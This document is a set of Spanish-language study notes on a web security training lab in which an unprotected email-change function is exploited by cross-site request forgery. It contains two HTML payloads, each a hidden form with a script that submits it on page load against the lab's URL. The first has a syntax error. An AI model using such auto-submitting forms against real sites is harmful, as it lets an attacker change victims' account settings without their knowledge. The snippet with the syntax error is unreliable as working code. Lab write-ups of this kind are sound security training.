En esta clase abordamos un caso básico de vulnerabilidad CSRF, en el que una funcionalidad sensible —el cambio de correo electrónico— carece de cualquier tipo de protección. Esto nos permite forzar acciones en la cuenta de un usuario autenticado simplemente haciendo que cargue una página con un formulario oculto y autoenviado.

La técnica consiste en construir una petición POST con los mismos parámetros que la funcionalidad legítima, y luego alojarla en el servidor de explotación proporcionado. Al incluir un pequeño script que autoenvía el formulario al cargar la página, conseguimos que la víctima realice la acción sin saberlo, usando su propia sesión activa.

Este laboratorio representa el escenario más sencillo de explotación CSRF, y sienta las bases para los siguientes ejercicios donde se introducirán mecanismos de defensa como tokens, verificación de cabeceras o validaciones del lado servidor.

Solucion
bueno para emepzar lo que seria lo ideal seria copiar el codigo fuente o el formulario en esta ocacion de la pagina que queremos vulnerar
en este caso le vamos a dar click derecho y editar como html
![Pasted image 20250722165509.png](imagenes/Pasted image 20250722165509.png)
para ello tenemos que modificar el codigo eliminando algunas cosas y checando cuales son los formularios en este caso solo tenemos uno y lo podemos ver de esta manera
![Pasted image 20250722170136.png](imagenes/Pasted image 20250722170136.png)
document.forms[0]
y para mandarlo seria asi document.forms[0].submit()

"
<form class="login-form" name="change-email-form" action="https://0a4500280331c6b38165c03600fc0046.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacketd@hacketd.com">
</form>

<script>
    document.forms(0).submit():
</script>
"
Este podria ser otro

"
<form method="POST" action="https://0a4500280331c6b38165c03600fc0046.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hola@hola.com">
</form>
<script>
        document.forms[0].submit();
</script>
"
